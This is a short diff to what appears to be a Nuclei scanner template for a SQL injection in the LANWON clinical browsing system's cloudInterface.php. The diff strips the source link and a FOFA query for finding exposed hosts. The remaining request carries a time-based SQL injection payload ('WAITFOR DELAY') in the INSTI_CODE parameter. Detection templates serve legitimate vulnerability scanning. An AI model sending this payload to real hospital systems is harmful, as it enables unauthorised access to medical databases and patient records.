@@ -3,12 +3,8 @@ info:
   name: 蓝网科技临床浏览系统-SQL注入-cloudInterface
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uwb88qn3sr79au5q'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uwb88qn3sr79au5q
-    fofa: app="LANWON-临床浏览系统"
 http:
 - raw:
   - 'GET /xds/cloudInterface.php?INSTI_CODE=1%27);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
